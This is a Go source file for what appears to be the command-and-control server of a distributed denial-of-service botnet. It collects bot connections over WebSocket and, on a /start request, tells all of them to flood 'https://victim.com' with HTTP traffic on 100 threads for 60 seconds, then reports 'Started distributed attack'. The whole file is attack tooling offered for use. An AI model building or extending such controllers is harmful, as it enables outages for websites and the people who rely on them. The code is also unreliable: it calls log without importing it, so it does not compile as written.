package main

import (
	"fmt"
	"net/http"
	"sync"
	"github.com/gorilla/websocket"
)

var (
	upgrader = websocket.Upgrader{}
	clients  = make(map[*websocket.Conn]bool)
	lock     sync.Mutex
)

func wsHandler(w http.ResponseWriter, r *http.Request) {
	conn, _ := upgrader.Upgrade(w, r, nil)
	lock.Lock()
	clients[conn] = true
	lock.Unlock()

	for {
		_, _, err := conn.ReadMessage()
		if err != nil {
			lock.Lock()
			delete(clients, conn)
			lock.Unlock()
			return
		}
	}
}

func broadcast(msg string) {
	lock.Lock()
	defer lock.Unlock()
	for conn := range clients {
		conn.WriteMessage(websocket.TextMessage, []byte(msg))
	}
}

func apiStart(w http.ResponseWriter, r *http.Request) {
	broadcast("START type=HTTP target=https://victim.com threads=100 duration=60")
	fmt.Fprintln(w, "Started distributed attack")
}

func main() {
	http.HandleFunc("/ws", wsHandler)
	http.HandleFunc("/start", apiStart)
	log.Println("🚀 Master server started on :8080")
	http.ListenAndServe(":8080", nil)
}
